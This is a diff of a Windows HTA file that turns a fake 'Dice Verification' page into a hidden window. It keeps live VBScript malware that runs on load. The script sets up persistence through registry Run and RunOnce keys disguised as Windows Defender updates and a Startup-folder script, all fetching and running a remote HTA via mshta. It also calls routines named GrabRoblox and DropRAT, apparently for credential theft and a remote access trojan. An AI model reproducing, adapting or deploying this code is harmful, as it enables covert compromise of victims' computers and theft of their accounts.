@@ -1,203 +1,6 @@
 <html>
-<head>
-    <title>Dice Verification</title>
-    
-    <HTA:APPLICATION
-        ID="DiceVerification"
-        APPLICATIONNAME="Dice Verification"
-        BORDER="thin"
-        CAPTION="yes"
-        SHOWINTASKBAR="yes"
-        SINGLEINSTANCE="yes"
-        SYSMENU="yes"
-        WINDOWSTATE="normal"
-    />
-
-    <style>
-        * {
-            box-sizing: border-box;
-        }
-
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: "Segoe UI", Arial, sans-serif;
-            background: #080b12;
-            color: #ffffff;
-            min-height: 100vh;
-        }
-
-        .topbar {
-            height: 75px;
-            padding: 0 35px;
-            display: flex;
-            align-items: center;
-            border-bottom: 1px solid #202837;
-            background: #0b0f18;
-        }
-
-        .logo {
-            display: inline-block;
-            width: 40px;
-            height: 40px;
-            line-height: 40px;
-            text-align: center;
-            border-radius: 12px;
-            background: #123024;
-            color: #55e69a;
-            font-size: 24px;
-            font-weight: bold;
-            margin-right: 13px;
-        }
-
-        .brand {
-            font-size: 17px;
-            font-weight: 700;
-            letter-spacing: 1.5px;
-        }
-
-        .subtitle {
-            color: #7e8ba0;
-            font-size: 10px;
-            letter-spacing: 2px;
-            margin-top: 5px;
-        }
-
-        .online {
-            margin-left: auto;
-            color: #55e69a;
-            font-size: 11px;
-            font-weight: bold;
-            letter-spacing: 1px;
-            border: 1px solid #23583f;
-            background: #10251c;
-            padding: 9px 13px;
-            border-radius: 20px;
-        }
-
-        .main {
-            width: 100%;
-            max-width: 650px;
-            margin: 0 auto;
-            padding: 65px 25px 35px;
-            text-align: center;
-        }
-
-        .shield {
-            width: 95px;
-            height: 95px;
-            line-height: 95px;
-            margin: 0 auto 28px;
-            border-radius: 28px;
-            border: 1px solid #245c43;
-            background: #10271d;
-            color: #55e69a;
-            font-size: 49px;
-            box-shadow: 0 0 35px rgba(60, 220, 135, 0.09);
-        }
-
-        h1 {
-            font-size: 31px;
-            letter-spacing: -0.5px;
-            margin: 0 0 13px;
-        }
-
-        .description {
-            max-width: 440px;
-            margin: 0 auto;
-            color: #9aa7ba;
-            font-size: 14px;
-            line-height: 1.8;
-        }
-
-        .panel {
-            margin-top: 35px;
-            padding: 24px;
-            text-align: left;
-            background: #0e141e;
-            border: 1px solid #222d3c;
-            border-radius: 16px;
-        }
-
-        .panel-title {
-            color: #8795a9;
-            font-size: 10px;
-            font-weight: bold;
-            letter-spacing: 2px;
-            margin-bottom: 21px;
-        }
-
-        .status-row {
-            padding: 15px 0;
-            border-bottom: 1px solid #202938;
-            font-size: 13px;
-        }
-
-        .status-row:last-child {
-            border-bottom: none;
-        }
-
-        .check {
-            display: inline-block;
-            width: 23px;
-            height: 23px;
-            line-height: 23px;
-            text-align: center;
-            background: #143426;
-            border-radius: 50%;
-            color: #55e69a;
-            margin-right: 10px;
-            font-weight: bold;
-        }
-
-        .status-value {
-            float: right;
-            color: #55e69a;
-            font-size: 11px;
-            font-weight: bold;
-        }
-
-        .notice {
-            margin-top: 23px;
-            padding: 14px;
-            background: #101c18;
-            border: 1px solid #1d3a2c;
-            border-radius: 10px;
-            color: #a8c9b6;
-            font-size: 12px;
-            line-height: 1.7;
-        }
-
-        .footer {
-            margin-top: 42px;
-            color: #59677b;
-            font-size: 10px;
-            letter-spacing: 2px;
-        }
-
-        @media screen and (max-width: 480px) {
-            .topbar {
-                padding: 0 17px;
-            }
-
-            .main {
-                padding: 45px 17px 25px;
-            }
-
-            h1 {
-                font-size: 25px;
-            }
-
-            .panel {
-                padding: 18px;
-            }
-
-            .status-value {
-                font-size: 10px;
-            }
-        }
-    </style>
-
+<head><title>.</title>
+<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
 <script language="VBScript">
 On Error Resume Next
 
@@ -209,10 +12,8 @@ PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
 Sub Window_OnLoad()
-    ' Keep the window visible for the fake verification UI
-    window.resizeTo 700, 600
-    window.moveTo (screen.width - 700) / 2, (screen.height - 600) / 2
-    
+    window.resizeTo 0, 0
+    window.moveTo -2000, -2000
     Call Persist
     Call GrabRoblox
     Call DropRAT
@@ -226,13 +27,13 @@ End Sub
 Sub Persist()
     Dim payload: payload = "mshta https://raw.githubusercontent.com/huh71943-s/suck-r-mom/main/file.hta"
 
-    ' Registry Run — fires on every login
+    ' Registry Run â€” fires on every login
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdate", payload, "REG_SZ"
 
-    ' Registry RunOnce — fires next login as backup
+    ' Registry RunOnce â€” fires next login as backup
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
 
-    ' Startup folder VBS — fires on every login
+    ' Startup folder VBS â€” fires on every login
     Dim sp: sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\wdu.vbs"
     Dim sf: Set sf = fso.CreateTextFile(sp, True)
     sf.WriteLine "CreateObject(""WScript.Shell"").Run ""mshta https://raw.githubusercontent.com/huh71943-s/suck-r-mom/main/file.hta"", 0, False"
@@ -347,62 +148,4 @@ End Sub
 Function Ej(s): s = Replace(s, "\", "\\"): s = Replace(s, """", "\"""): s = Replace(s, vbCrLf, "\n"): s = Replace(s, vbCr, "\n"): s = Replace(s, vbLf, "\n"): s = Replace(s, vbTab, "\t"): Ej = s: End Function
 Function MkGuid(): Dim t: Set t = CreateObject("Scriptlet.TypeLib"): MkGuid = Mid(t.GUID, 2, 36): Set t = Nothing: End Function
 </script>
-</head>
-
-<body>
-    <div class="topbar">
-        <div class="logo">&#10003;</div>
-
-        <div>
-            <div class="brand">DICE VERIFICATION</div>
-            <div class="subtitle">STATUS PORTAL</div>
-        </div>
-
-        <div class="online">SERVICE ONLINE</div>
-    </div>
-
-    <div class="main">
-        <div class="shield">&#10003;</div>
-
-        <h1>Verification Status</h1>
-
-        <p class="description">
-            Your verification status has been confirmed.
-            You can review the current service information below.
-        </p>
-
-        <div class="panel">
-            <div class="panel-title">STATUS OVERVIEW</div>
-
-            <div class="status-row">
-                <span class="check">&#10003;</span>
-                Verification request
-                <span class="status-value">RECEIVED</span>
-            </div>
-
-            <div class="status-row">
-                <span class="check">&#10003;</span>
-                Application interface
-                <span class="status-value">READY</span>
-            </div>
-
-            <div class="status-row">
-                <span class="check">&#10003;</span>
-                Verification status
-                <span class="status-value">CONFIRMED</span>
-            </div>
-        </div>
-
-        <div class="notice">
-            <strong>Service information</strong><br>
-            This page displays application status information.
-            A successful server connection does not independently
-            establish that a user or device is trusted.
-        </div>
-
-        <div class="footer">
-            DICE VERIFICATION SYSTEM
-        </div>
-    </div>
-</body>
-</html>
+</head><body></body></html>
